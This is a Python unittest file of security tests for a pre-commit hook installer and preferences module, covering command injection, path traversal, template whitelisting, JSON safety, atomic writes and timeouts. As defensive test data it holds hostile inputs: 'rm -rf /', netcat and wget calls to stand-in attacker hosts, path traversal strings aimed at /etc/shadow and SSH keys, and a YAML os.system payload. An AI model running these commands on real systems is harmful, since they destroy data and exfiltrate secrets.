#!/usr/bin/env python3
"""
Security tests for pre-commit system (hook + skill + preferences).

Testing pyramid:
- 60% Unit tests (fast, heavily mocked)
- 30% Integration tests (multiple components)
- 10% E2E tests (complete workflows)

Tests security requirements:
- Command injection prevention
- Path traversal prevention
- Template whitelist validation
- JSON parsing safety
- Atomic file writes with correct permissions
- Subprocess timeout enforcement
"""

import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, Mock, patch

# These imports will fail until implementation is complete
try:
    sys.path.insert(0, str(Path(__file__).parent.parent))
    import precommit_prefs
    from precommit_installer import PrecommitInstallerHook

    sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent.parent))
    from skills.precommit_manager import PrecommitManager

    SECURITY_TEST_AVAILABLE = True
except ImportError:
    SECURITY_TEST_AVAILABLE = False


class TestCommandInjectionPrevention(unittest.TestCase):
    """Test command injection prevention (Unit - 60%)."""

    def setUp(self):
        """Set up test environment."""
        if not SECURITY_TEST_AVAILABLE:
            self.skipTest("Pre-commit system not fully implemented yet")
        self.temp_dir = Path(tempfile.mkdtemp())

    def tearDown(self):
        """Clean up temp directory."""
        import shutil

        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_subprocess_uses_list_form_not_shell(self):
        """Test that subprocess calls use list form (not shell=True)."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()
        config_file = self.temp_dir / ".pre-commit-config.yaml"
        config_file.write_text("repos: []")

        hook = PrecommitInstallerHook()
        hook.project_root = self.temp_dir
        hook.log = MagicMock()
        hook.save_metric = MagicMock()

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
            with patch.object(hook, "_is_precommit_available", return_value={"available": True}):
                with patch.object(hook, "_are_hooks_installed", return_value={"installed": False}):
                    hook._install_hooks()

        # Verify subprocess.run called with list, not string
        call_args = mock_run.call_args
        self.assertIsInstance(call_args[0][0], list)

        # Verify shell=True not used
        call_kwargs = call_args[1] if len(call_args) > 1 else {}
        self.assertNotIn("shell", call_kwargs)

    def test_malicious_command_in_subprocess_args_prevented(self):
        """Test that malicious commands cannot be injected via subprocess args."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()

        # Attempt to inject shell command
        malicious_input = "; rm -rf /"

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
            # This should safely pass the malicious string as a literal argument
            # not execute it as a shell command

        # Verify that even if malicious input reaches subprocess, it's safe
        # because we use list form
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
            # Simulating a call with potentially malicious input
            subprocess.run(
                ["pre-commit", "install", malicious_input],
                capture_output=True,
                text=True,
                timeout=30,
                check=False,
            )
            # This should safely fail or ignore the malicious argument

    def test_no_shell_metacharacters_executed(self):
        """Test that shell metacharacters are not executed."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()
        config_file = self.temp_dir / ".pre-commit-config.yaml"
        config_file.write_text("repos: []")

        hook = PrecommitInstallerHook()
        hook.project_root = self.temp_dir

        # Shell metacharacters that should not be executed
        _ = [
            "; cat /etc/passwd",
            "| nc attacker.com 1234",
            "&& wget malware.com/evil.sh",
            "`id`",
            "$(whoami)",
        ]

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
            hook._install_hooks()

        # Verify subprocess.run uses list form, preventing shell interpretation
        call_args = mock_run.call_args
        self.assertIsInstance(call_args[0][0], list)


class TestPathTraversalPrevention(unittest.TestCase):
    """Test path traversal prevention (Unit - 60%)."""

    def setUp(self):
        """Set up test environment."""
        if not SECURITY_TEST_AVAILABLE:
            self.skipTest("Pre-commit system not fully implemented yet")
        self.temp_dir = Path(tempfile.mkdtemp())
        self.manager = PrecommitManager(project_root=self.temp_dir)

    def tearDown(self):
        """Clean up temp directory."""
        import shutil

        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_path_traversal_rejected_in_configure(self):
        """Test that path traversal attempts are rejected in configure."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()

        malicious_paths = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "..\\..\\windows\\system32\\config\\sam",
            "../../../../../../../../../etc/shadow",
        ]

        for path in malicious_paths:
            result = self.manager.configure(template=path)
            self.assertFalse(result["success"], f"Path traversal should be prevented: {path}")
            self.assertIn("invalid", result["error"].lower())

    def test_absolute_path_rejected_in_configure(self):
        """Test that absolute paths are rejected in configure."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()

        absolute_paths = [
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "/root/.ssh/id_rsa",
        ]

        for path in absolute_paths:
            result = self.manager.configure(template=path)
            self.assertFalse(result["success"], f"Absolute path should be rejected: {path}")

    def test_path_normalization_doesnt_escape(self):
        """Test that path normalization doesn't allow escaping project root."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()

        tricky_paths = [
            "./../../etc/passwd",
            "./../../../root",
            "templates/../../../../../../etc/passwd",
        ]

        for path in tricky_paths:
            result = self.manager.configure(template=path)
            self.assertFalse(result["success"], f"Tricky path should be prevented: {path}")

    def test_valid_template_paths_allowed(self):
        """Test that valid template paths are allowed."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()

        valid_templates = ["python", "javascript", "typescript"]

        for template in valid_templates:
            result = self.manager.configure(template=template)
            # Should not fail due to path validation (may fail for other reasons)
            if not result["success"]:
                self.assertNotIn("path", result.get("error", "").lower())
                self.assertNotIn("invalid", result.get("error", "").lower())


class TestTemplateWhitelistValidation(unittest.TestCase):
    """Test template whitelist validation (Unit - 60%)."""

    def setUp(self):
        """Set up test environment."""
        if not SECURITY_TEST_AVAILABLE:
            self.skipTest("Pre-commit system not fully implemented yet")
        self.temp_dir = Path(tempfile.mkdtemp())
        self.manager = PrecommitManager(project_root=self.temp_dir)

    def tearDown(self):
        """Clean up temp directory."""
        import shutil

        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_only_whitelisted_templates_allowed(self):
        """Test that only whitelisted templates are allowed."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()

        # Valid templates (whitelist)
        valid = ["python", "javascript", "typescript", "go", "rust", "generic"]

        for template in valid:
            result = self.manager.configure(template=template)
            # Should not fail due to whitelist validation
            if not result["success"]:
                self.assertNotIn("whitelist", result.get("error", "").lower())

        # Invalid templates (not in whitelist)
        invalid = ["__init__", "__pycache__", ".git", ".env", "malicious"]

        for template in invalid:
            result = self.manager.configure(template=template)
            self.assertFalse(result["success"], f"Template should be rejected: {template}")

    def test_template_injection_rejected(self):
        """Test that template injection attempts are rejected."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()

        injection_attempts = [
            "python; rm -rf /",
            "javascript && cat /etc/passwd",
            "python | nc attacker.com 1234",
        ]

        for attempt in injection_attempts:
            result = self.manager.configure(template=attempt)
            self.assertFalse(result["success"])

    def test_whitelist_case_sensitive(self):
        """Test that whitelist validation is case-sensitive."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()

        # Lowercase should work
        self.manager.configure(template="python")
        # May succeed or fail for other reasons, but not due to case

        # Uppercase should be rejected (assuming case-sensitive whitelist)
        self.manager.configure(template="PYTHON")
        # Should fail due to whitelist


class TestJSONParsingSafety(unittest.TestCase):
    """Test JSON parsing safety in preferences (Unit - 60%)."""

    def setUp(self):
        """Set up test environment."""
        if not SECURITY_TEST_AVAILABLE:
            self.skipTest("Pre-commit system not fully implemented yet")
        self.temp_dir = Path(tempfile.mkdtemp())

    def tearDown(self):
        """Clean up temp directory."""
        import shutil

        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_malformed_json_handled_safely(self):
        """Test that malformed JSON doesn't crash the system."""
        malformed_json = "{ this is not valid json }"

        prefs_file = self.temp_dir / ".claude" / "state" / "precommit_prefs.json"
        prefs_file.parent.mkdir(parents=True)
        prefs_file.write_text(malformed_json)

        with patch("pathlib.Path.home", return_value=self.temp_dir):
            # Should not raise exception
            result = precommit_prefs.load_precommit_preference()

        # Should fall back to default
        self.assertEqual(result, "ask")

    def test_json_injection_prevented(self):
        """Test that JSON injection attempts are prevented."""
        # Attempt to inject malicious code via JSON
        malicious_json = {
            "precommit_preference": "always",
            "last_prompted": "'; DROP TABLE users; --",
            "__proto__": {"isAdmin": True},  # Prototype pollution attempt
        }

        prefs_file = self.temp_dir / ".claude" / "state" / "precommit_prefs.json"
        prefs_file.parent.mkdir(parents=True)
        with open(prefs_file, "w") as f:
            json.dump(malicious_json, f)

        with patch("pathlib.Path.home", return_value=self.temp_dir):
            # Should safely load without executing malicious payload
            result = precommit_prefs.load_precommit_preference()

        # Should return valid preference
        self.assertIn(result, ["always", "never", "ask"])

    def test_deeply_nested_json_doesnt_cause_dos(self):
        """Test that deeply nested JSON doesn't cause DoS."""
        # Create deeply nested JSON (potential DoS)
        nested = {"a": None}
        current = nested
        for i in range(1000):
            current["a"] = {"a": None}
            current = current["a"]

        prefs_file = self.temp_dir / ".claude" / "state" / "precommit_prefs.json"
        prefs_file.parent.mkdir(parents=True)

        try:
            with open(prefs_file, "w") as f:
                json.dump(nested, f)

            with patch("pathlib.Path.home", return_value=self.temp_dir):
                # Should handle gracefully (timeout or safe parse)
                result = precommit_prefs.load_precommit_preference()

            # Should fall back to default on error
            self.assertEqual(result, "ask")
        except RecursionError:
            # If recursion error, test passes (shows vulnerability)
            self.fail("Deeply nested JSON caused RecursionError - needs protection")


class TestAtomicFileWrites(unittest.TestCase):
    """Test atomic file writes with correct permissions (Unit - 60%)."""

    def setUp(self):
        """Set up test environment."""
        if not SECURITY_TEST_AVAILABLE:
            self.skipTest("Pre-commit system not fully implemented yet")
        self.temp_dir = Path(tempfile.mkdtemp())

    def tearDown(self):
        """Clean up temp directory."""
        import shutil

        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_preference_file_written_with_correct_permissions(self):
        """Test that preference file has 0o600 permissions."""
        with patch("pathlib.Path.home", return_value=self.temp_dir):
            precommit_prefs.save_precommit_preference("always")

        prefs_file = self.temp_dir / ".claude" / "state" / "precommit_prefs.json"
        stat_result = prefs_file.stat()
        perms = stat_result.st_mode & 0o777

        # Should be owner read/write only (0o600)
        self.assertEqual(perms, 0o600, f"Expected 0o600, got {oct(perms)}")

    def test_atomic_write_prevents_partial_reads(self):
        """Test that atomic writes prevent partial reads during write."""
        import threading
        import time

        results = []

        def write_preference():
            with patch("pathlib.Path.home", return_value=self.temp_dir):
                for _ in range(5):
                    precommit_prefs.save_precommit_preference("always")
                    time.sleep(0.01)

        def read_preference():
            with patch("pathlib.Path.home", return_value=self.temp_dir):
                for _ in range(10):
                    try:
                        result = precommit_prefs.load_precommit_preference()
                        results.append(result)
                    except json.JSONDecodeError:
                        results.append("CORRUPTED")
                    time.sleep(0.005)

        writer = threading.Thread(target=write_preference)
        reader = threading.Thread(target=read_preference)

        writer.start()
        reader.start()

        writer.join()
        reader.join()

        # No reads should be corrupted
        self.assertNotIn("CORRUPTED", results)

    def test_write_failure_doesnt_corrupt_existing_file(self):
        """Test that write failures don't corrupt existing file."""
        # Write initial preference
        with patch("pathlib.Path.home", return_value=self.temp_dir):
            precommit_prefs.save_precommit_preference("always")

        # Verify initial state
        with patch("pathlib.Path.home", return_value=self.temp_dir):
            initial = precommit_prefs.load_precommit_preference()
        self.assertEqual(initial, "always")

        # Attempt write that fails
        with patch("pathlib.Path.home", return_value=self.temp_dir):
            with patch("builtins.open", side_effect=OSError("Disk full")):
                try:
                    precommit_prefs.save_precommit_preference("never")
                except OSError:
                    pass

        # Original file should still be valid
        with patch("pathlib.Path.home", return_value=self.temp_dir):
            after_failed_write = precommit_prefs.load_precommit_preference()

        # Should still be "always" (not corrupted)
        self.assertEqual(after_failed_write, "always")


class TestSubprocessTimeoutEnforcement(unittest.TestCase):
    """Test subprocess timeout enforcement (Unit - 60%)."""

    def setUp(self):
        """Set up test environment."""
        if not SECURITY_TEST_AVAILABLE:
            self.skipTest("Pre-commit system not fully implemented yet")
        self.temp_dir = Path(tempfile.mkdtemp())

    def tearDown(self):
        """Clean up temp directory."""
        import shutil

        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_subprocess_has_timeout(self):
        """Test that subprocess calls have timeout parameter."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()
        config_file = self.temp_dir / ".pre-commit-config.yaml"
        config_file.write_text("repos: []")

        hook = PrecommitInstallerHook()
        hook.project_root = self.temp_dir

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
            hook._install_hooks()

        # Verify timeout parameter present
        call_kwargs = mock_run.call_args[1]
        self.assertIn("timeout", call_kwargs)
        self.assertIsInstance(call_kwargs["timeout"], (int, float))
        self.assertGreater(call_kwargs["timeout"], 0)

    def test_subprocess_timeout_is_reasonable(self):
        """Test that subprocess timeout is reasonable (not too long)."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()
        config_file = self.temp_dir / ".pre-commit-config.yaml"
        config_file.write_text("repos: []")

        hook = PrecommitInstallerHook()
        hook.project_root = self.temp_dir

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
            hook._install_hooks()

        call_kwargs = mock_run.call_args[1]
        timeout = call_kwargs["timeout"]

        # Timeout should be reasonable (e.g., 30-120 seconds)
        self.assertLessEqual(timeout, 120, "Timeout too long (DoS risk)")
        self.assertGreaterEqual(timeout, 10, "Timeout too short (may fail legitimate operations)")

    def test_timeout_exception_handled_gracefully(self):
        """Test that timeout exceptions are handled gracefully."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()
        config_file = self.temp_dir / ".pre-commit-config.yaml"
        config_file.write_text("repos: []")

        hook = PrecommitInstallerHook()
        hook.project_root = self.temp_dir
        hook.log = MagicMock()

        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("pre-commit", 30)):
            result = hook._install_hooks()

        self.assertFalse(result["success"])
        self.assertIn("timeout", result["error"].lower())


class TestIntegrationSecurityScenarios(unittest.TestCase):
    """Test security in integration scenarios (Integration - 30%)."""

    def setUp(self):
        """Set up test environment."""
        if not SECURITY_TEST_AVAILABLE:
            self.skipTest("Pre-commit system not fully implemented yet")
        self.temp_dir = Path(tempfile.mkdtemp())

    def tearDown(self):
        """Clean up temp directory."""
        import shutil

        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_malicious_config_file_doesnt_execute_code(self):
        """Test that malicious YAML config doesn't execute code."""
        git_dir = self.temp_dir / ".git"
        git_dir.mkdir()

        # YAML with potential code execution
        malicious_yaml = """
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    hooks:
      - id: !!python/object/new:os.system [echo "pwned"]
"""
        config_file = self.temp_dir / ".pre-commit-config.yaml"
        config_file.write_text(malicious_yaml)

        hook = PrecommitInstallerHook()
        hook.project_root = self.temp_dir
        hook.log = MagicMock()
        hook.save_metric = MagicMock()

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="Invalid YAML")
            with patch.object(hook, "_is_precommit_available", return_value={"available": True}):
                with patch.object(hook, "_are_hooks_installed", return_value={"installed": False}):
                    hook.process({})

        # Should handle gracefully without executing code
        # pre-commit itself should reject the malicious YAML

    def test_race_condition_in_preference_save(self):
        """Test that race conditions in preference save don't corrupt data."""
        import threading

        def save_preference(value):
            with patch("pathlib.Path.home", return_value=self.temp_dir):
                precommit_prefs.save_precommit_preference(value)

        threads = []
        for i in range(10):
            value = "always" if i % 2 == 0 else "never"
            thread = threading.Thread(target=save_preference, args=(value,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # Verify file is valid JSON (not corrupted)
        prefs_file = self.temp_dir / ".claude" / "state" / "precommit_prefs.json"
        with open(prefs_file) as f:
            data = json.load(f)  # Should not raise JSONDecodeError

        # Preference should be valid
        self.assertIn(data["precommit_preference"], ["always", "never"])


if __name__ == "__main__":
    unittest.main()
